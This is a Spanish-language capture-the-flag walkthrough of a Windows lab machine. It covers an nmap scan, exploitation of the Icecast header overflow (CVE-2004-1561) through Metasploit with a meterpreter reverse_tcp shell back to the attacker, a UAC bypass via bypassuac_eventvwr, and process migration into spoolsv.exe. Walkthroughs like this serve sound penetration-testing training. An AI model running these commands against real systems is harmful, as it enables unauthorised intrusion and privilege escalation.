Bievenidos nuevamente, esta maquina esta basada en sistema operativo windows en el cual realizaremos un escaneo nmap y buscaremos vulnerabilidades que se adapten a las versiones obtenidas por dicho escaneo y escalaremos privilegios con #Metasploit migrando procesos para robar sus credenciales con la ayuda de #kiwi 

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`
```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.22s latency).
Scanned at 2023-05-03 21:50:16 EDT for 126s
Not shown: 65456 closed tcp ports (reset), 67 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 127
5357/tcp  open  http               syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http               'syn-ack ttl 127 Icecast streaming media' server
49152/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49159/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49160/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```


##

Para iniciar nuestra intrusion, buscaremos una vulnerabilidad que se adapte a la version obtenida por nmap "**icecast**". Para obtener mayor informacion acerca de la vulnerabilidad, podemos buscarla por Google, o bien utilizamos paginas como #exploit-db o #cvedetails. Encontramos la vulnerabilidad #CVE-2004-1561, basada en comando de ejecucion overflow.  
`Buffer overflow in Icecast 2.0.1 and earlier allows remote attackers to execute arbitrary code via an HTTP request with a large number of headers.`


#  Metasploit 

Iniciamos nuestra sesion en metasploit ejecutado `msfconsole`  y buscaremos la vulnerabilidad con `search icecast` 

```ruby
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
```

La seleccionaremos con `use 0` y utilizaremos nuestra carga util `set payload windows/meterpreter/reverse_tcp` . Podremos ver las opciones que tengamos que configurar ejecutando `show options`, para que nuestro exploit funcione, tendremos que configurar las siguientes opciones.

>`RHOSTS` ---> Ip Victima
>`RPORT` --->  Puerto target, en defecto "8000"
>`LHOST` ---> Ip maquina atacante

Una vez configurado, ejecutaremos el exploit `run`. 
Luego de obtener una shell de meterpreter, con los comandos `getuid & sysinfo` obtendremos una informacion basica de la maquina victima. Para obtener informacion privilegiada, iniciaremos un reconocimiento sobre diferentes exploits que nos permiten adquirir el acceso como **NT/AUTHORITY**. Ejecutaremos `run post/multi/recon/local_exploit_suggester` 

# Priv. Escalation

Luego, una vez terminado el proceso, elegimos el exploit que nos encontro positivo, en mi caso, `exploit/windows/local/bypassuac_eventvwr`. 
Pondremos nuestra sesion de meterpreter en background con `CTRL+Z` y elegimos nuestro nuevo exploit `use exploit/windows/local/bypassuac_eventvwr` , configuramos la sesion `set SESSION 1 `,nuestro `LHOST` y ejecutaremos con `run`.

Una vez obtenido nuestra nueva shell, una buena recomendacion es listar que procesos estan ejecutandose en el sistema, esto lo hacemos con un `ps`. Necesitaremos migrar de procesos para obtener privilegios elevados. Migraremos los permisos a spoolsv.exe, que es un servicio de cola de impresion que se reinicia incluso cuando se crashea. 

Para hacer el proceso de migrado, ejecutaremos `migrate -N spoolsv.exe`. Para corroborar que estamos con permisos elevados, ejecutamos `getuid`.
 

# 